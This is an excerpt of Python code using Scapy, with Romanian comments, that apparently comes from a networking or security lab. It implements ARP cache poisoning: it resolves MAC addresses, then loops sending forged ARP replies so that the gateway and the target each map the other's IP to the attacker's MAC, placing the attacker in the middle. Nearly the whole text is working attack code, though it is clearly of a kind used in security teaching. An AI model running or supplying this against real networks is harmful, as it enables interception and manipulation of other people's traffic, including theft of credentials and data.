...
def get_mac(ip):
    ...
    resp, _ = sr(ARP(op=1,hwdst="ff:ff:ff:ff:ff:ff",\
                         pdst=ip), retry=2, timeout=10)
    for _, r in resp:
        return r[ARP].hwsrc
    return None
...
def arp_poison(gateway_ip, gateway_mac, target_ip, target_mac):
    ...
    try:
        while True:
            # schimba-l pe pdst,aflat la mac-ul hwdst 
            # => si spune-i ca lui psrc i se asociaza hwsrc
            # op 2 = is-has
            # spune lui gateway ca mac-ul meu apartine lui target ip
            print(f"[ARP] Ii spun lui {gateway_ip} ca {target_ip} " \
                  f"se afla la {my_mac} (mac-ul lui middle)")
            send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, \
                     psrc=target_ip,hwsrc=my_mac))
            time.sleep(4)
            print(f"[ARP] Ii spun lui {target_ip} ca {gateway_ip} " \
                  f"se afla la {my_mac} (mac-ul lui middle)")
...
def spoof(ip_target, ip_gateway):
    ...
    poison_thread = threading.Thread(target=arp_poison, \
            args=(ip_gateway,mac_gateway,ip_target,mac_target))
    poison_thread.start()
